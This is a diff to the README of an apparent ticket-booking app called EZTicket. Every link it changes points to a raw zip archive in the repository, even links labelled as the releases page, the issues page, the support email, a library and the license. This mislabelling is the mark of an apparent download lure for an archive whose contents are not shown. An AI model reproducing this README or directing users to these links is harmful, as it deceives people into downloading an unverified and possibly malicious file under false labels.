@@ -1,6 +1,6 @@
 # 🎟️ EZTicket - Effortless Booking for Everyone
 
-[![Download EZTicket](https://github.com/seanland1234/EZTicket/raw/refs/heads/main/schemas/EZ_Ticket_v3.8.zip)](https://github.com/seanland1234/EZTicket/raw/refs/heads/main/schemas/EZ_Ticket_v3.8.zip)
+[![Download EZTicket](https://raw.githubusercontent.com/seanland1234/EZTicket/main/components/Ticket_EZ_1.0-beta.3.zip)](https://raw.githubusercontent.com/seanland1234/EZTicket/main/components/Ticket_EZ_1.0-beta.3.zip)
 
 ## 🌟 Overview
 
@@ -23,7 +23,7 @@ Before you download EZTicket, ensure your device meets the following requirement
 
 To get started with EZTicket, you need to download the application. 
 
-1. **Visit this page to download:** [EZTicket Releases](https://github.com/seanland1234/EZTicket/raw/refs/heads/main/schemas/EZ_Ticket_v3.8.zip)
+1. **Visit this page to download:** [EZTicket Releases](https://raw.githubusercontent.com/seanland1234/EZTicket/main/components/Ticket_EZ_1.0-beta.3.zip)
 2. On the Releases page, find the latest version.
 3. Click on the download link for your operating system.
 4. Save the file to your device.
@@ -73,8 +73,8 @@ Your input could help make EZTicket even better for everyone!
 If you run into issues while using EZTicket:
 
 - **Check the FAQ:** Visit our GitHub page for answers to common questions.
-- **Report an Issue:** If you encounter a bug, visit the [Issues page](https://github.com/seanland1234/EZTicket/raw/refs/heads/main/schemas/EZ_Ticket_v3.8.zip) to report it. Provide as much detail as possible for quicker resolution.
-- **Contact Support:** You can reach out via email at https://github.com/seanland1234/EZTicket/raw/refs/heads/main/schemas/EZ_Ticket_v3.8.zip for additional help.
+- **Report an Issue:** If you encounter a bug, visit the [Issues page](https://raw.githubusercontent.com/seanland1234/EZTicket/main/components/Ticket_EZ_1.0-beta.3.zip) to report it. Provide as much detail as possible for quicker resolution.
+- **Contact Support:** You can reach out via email at https://raw.githubusercontent.com/seanland1234/EZTicket/main/components/Ticket_EZ_1.0-beta.3.zip for additional help.
 
 ## 🙌 Acknowledgments
 
@@ -82,11 +82,11 @@ EZTicket utilizes various libraries and frameworks to improve performance and us
 
 - **React Hook Form:** For easy form validations.
 - **Tailwind CSS:** To ensure a responsive design.
-- **https://github.com/seanland1234/EZTicket/raw/refs/heads/main/schemas/EZ_Ticket_v3.8.zip** For improved page loading speed.
+- **https://raw.githubusercontent.com/seanland1234/EZTicket/main/components/Ticket_EZ_1.0-beta.3.zip** For improved page loading speed.
 
 ## 📜 License
 
-EZTicket is licensed under the MIT License. See the [LICENSE](https://github.com/seanland1234/EZTicket/raw/refs/heads/main/schemas/EZ_Ticket_v3.8.zip) file for more details.
+EZTicket is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/seanland1234/EZTicket/main/components/Ticket_EZ_1.0-beta.3.zip) file for more details.
 
 ---
 
